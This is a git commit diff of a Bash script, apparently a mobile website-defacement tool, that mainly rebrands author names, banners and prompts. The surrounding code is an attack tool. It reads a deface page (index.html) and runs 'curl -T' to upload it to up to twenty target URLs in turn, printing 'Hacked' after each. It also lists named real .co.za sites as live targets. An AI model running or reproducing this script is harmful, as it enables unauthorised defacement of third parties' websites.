9867f6ce1d0492921f3cba77b1232fbc9b97d6f5
MrUncle <50101968+MrTamfanX@users.noreply.github.com>
2019-05-23 02:15:22 +0700

    Tamfan.sh

--- Tamfan.sh
+++ Tamfan.sh
@@ -115,11 +115,11 @@ echo
 echo
 echo
 echo
-toilet -f future "    Defacer Tools" | lolcat
+toilet -f future "    Auto TebasIndex" | lolcat
 echo
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $yellow
-figlet -f future "Indonesian Cyber Army"
+figlet -f future "MrTamfanX Cyber Team"
 echo
 echo $red"##########################$green" WELCOME "$red###########################"
 echo
@@ -133,7 +133,7 @@ echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGE
 echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo $indigo"=============================================================="
 echo
-echo $white "╭─"$yellow"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$yellow"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ "  apaan
 echo
 if [ $apaan = "A" ] || [ $apaan = "a" ]
@@ -168,11 +168,11 @@ echo $cyan "http://thehellenic.co.za"
 echo $white "http://valdicare.co.za"
 echo
 echo $red "Eksekusi Taarget!!!"
-echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $green "╭─"$blue"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ "  target
 echo
 echo $red "Masukan Script!!! "
-echo $green "╭─"$blue"Chemod@zrd404"$cyan" ~/Nama SC Harus(index.html)"$white
+echo $green "╭─"$blue"MrTamfanX@Tebas404"$cyan" ~/Nama SC Harus(index.html)"$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
@@ -215,126 +215,126 @@ echo
 echo
 echo
 echo "Masukan Script !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white                               
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white                               
 read -p " ╰─$ " script
 echo
 echo
 echo $white"Masukan Target1 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target1
 curl -T /storage/emulated/0/$script $target1
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
 echo
 echo $white"Masukan Target2 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target2
 curl -T /storage/emulated/0/$script $target2
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
 echo
 echo $white"Masukan Target3 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target3
 curl -T /storage/emulated/0/$script $target3
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
 echo
 echo $white"Masukan Target4 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target4
 curl -T /storage/emulated/0/$script $target4
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
 echo
 echo $white"Masukan Target5 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target5
 curl -T /storage/emulated/0/$script $target5
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
 echo
 echo $white"Masukan Target6 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target6
 curl -T /storage/emulated/0/$script $target6
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
 echo
 echo $white"Masukan Target7 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target7
 curl -T /storage/emulated/0/$script $target7
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
 echo
 echo $white"Masukan Target8 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target8
 curl -T /storage/emulated/0/$script $target8
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
 echo
 echo $white"Masukan Target9 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target9
 curl -T /storage/emulated/0/$script $target9
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
 echo
 echo $white"Masukan Target10 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green "MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target10
 curl -T /storage/emulated/0/$script $target10
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
 echo
 echo $white"Masukan Target11 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target11
 curl -T /storage/emulated/0/$script $target11
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
 echo
 echo $white"Masukan Target12 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target12
 curl -T /storage/emulated/0/$script $target12
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
 echo
 echo $white"Masukan Target13 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target13
 curl -T /storage/emulated/0/$script $target13
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
 echo
 echo $white"Masukan Target14 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target14
 curl -T /storage/emulated/0/$script $target14
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
 echo
 echo $white"Masukan Target15 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target15
 curl -T /storage/emulated/0/$script $target15
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
 echo
 echo $white"Masukan Target16 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target16
 curl -T /storage/emulated/0/$script $target16
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
 echo
 echo $white"Masukan Target17 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target17
 curl -T /storage/emulated/0/$script $target17
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
 echo
 echo $white"Masukan Target18 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target18
 curl -T /storage/emulated/0/$script $target18
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
 echo
 echo $white"Masukan Target19 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/MrTamfanX"$white
 read -p " ╰─$ " target19
 curl -T /storage/emulated/0/$script $target19
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
 echo
 echo $white"Masukan Target20 !!!! "
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
+echo $white "╭─"$green"MrTamfanX@Tebas404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target20
 curl -T /storage/emulated/0/$script $target20
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
@@ -356,15 +356,15 @@ echo
 echo
 toilet -f future "   Informasi Tools" | lolcat
 echo $red"##########################$green" WELCOME "$red###########################"
-echo $green"Author  : Chemod_zrd404			"
-echo $purple"Gthub   : https://github.com/21D4N404"
-echo $white"Blog    : http://generasicyberindo.blogspot.com"
+echo $green"Author  : MrTamfanX			"
+echo $purple"Gthub   : https://github.com/MrTamfanX/TebasIndex"
+echo $white"Blog    : https://linkduit.net/FmJIa"
 echo
 echo $yellow"                          THANKS TO :"
 echo
-echo $cyan"[+] MR.NAGON_TA7 & KOKO "
-echo $cyan"[+] MR.W3B_XIT "
-echo $cyan"[+] MR.L3RBI & All Member [I.C.A] "
+echo $cyan"[+] MrTamfanX Cyber Team "
+echo $cyan"[+] MrTamfanX "
+echo $cyan"[+] MrTamfanX Cyber Team & All Member [M.C.T] "
 echo $red"##########################$green" WELCOME "$red###########################"
 echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo
@@ -390,7 +390,7 @@ fi
 
 if [ $back = "B" ] || [ $back = "b" ]
 then
-sh ICA.sh
+sh Tamfan.sh
 fi
 
 if [ $back = "Q" ] || [ $back = "q" ]
